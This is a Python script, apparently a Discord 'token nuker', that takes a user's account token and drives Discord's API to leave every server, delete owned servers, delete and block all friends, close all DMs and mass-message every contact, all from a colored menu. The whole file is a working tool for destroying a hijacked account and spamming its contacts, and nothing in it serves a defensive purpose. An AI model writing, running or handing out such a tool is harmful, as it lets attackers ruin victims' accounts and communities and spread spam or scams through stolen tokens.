import requests
import time
from pystyle import Colors, Colorate


def authenticate(token):
    headers = {"Authorization": f"{token}"}
    return headers

def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

def clear():
    print("\033c", end="")

def Nuke_account(token):
    print("Nuking account...")
    leaveServer(token)
    deleteFriends(token)
    deleteServers(token)
    close_all_dms(token)
    blockAllFriends(token)

def leaveServer(token):
    print("Leaving servers...")
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headers)
    print("Left all servers.")

def deleteFriends(token):
    print("Deleting friends...")
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
    print("Deleted all friends.")

def deleteServers(token):
    print("Deleting servers...")
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        if guild['owner']:
            requests.delete(f"https://discord.com/api/v9/guilds/{guild['id']}", headers=headers)
    print("Deleted all servers where user was the owner.")

def massDM(token, content):
    print("Sending mass DM...")
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        channel = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": friend['id']}).json()
        requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json={"content": content})
    print("Sent mass DM to all friends.")

def close_all_dms(token):
    print("Closing all DMs...")
    headers = authenticate(token)
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
    print("Closed all DMs.")

def blockAllFriends(token):
    print("Blocking all friends...")
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.put(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers, json={"type": 2})
    print("Blocked all friends.")

def Token_nuker():
    clear()
    options = """
    [01] > Nuke Token
    [02] > Leave Servers
    [03] > Delete Friends
    [04] > Delete Servers
    [05] > Mass DM
    [06] > Close DMs
    [07] > Block All Friends
    [00] > Leave
    """
    print(Colorate.Horizontal(Colors.red_to_purple, options))
    choice = input("[>] Choice: ")
    if choice == "1":
        clear()
        token = input("[>] Token: ")
        Nuke_account(token)
        Token_nuker()
    elif choice == "2":
        clear()
        token = input("[>] Token: ")
        leaveServer(token)
        Token_nuker()
    elif choice == "3":
        clear()
        token = input("[>] Token: ")
        deleteFriends(token)
        Token_nuker()
    elif choice == "4":
        clear()
        token = input("[>] Token: ")
        deleteServers(token)
        Token_nuker()
    elif choice == "5":
        clear()
        token = input("[>] Token: ")
        content = input("[>] Message: ")
        massDM(token, content)
        Token_nuker()
    elif choice == "6":
        clear()
        token = input("[>] Token: ")
        close_all_dms(token)
        Token_nuker()
    elif choice == "7":
        clear()
        token = input("[>] Token: ")
        blockAllFriends(token)
        Token_nuker()
    elif choice == "0":
        print("Quitting...")
        exit()
    else:
        print("Invalid choice")
        time.sleep(1)
        Token_nuker()
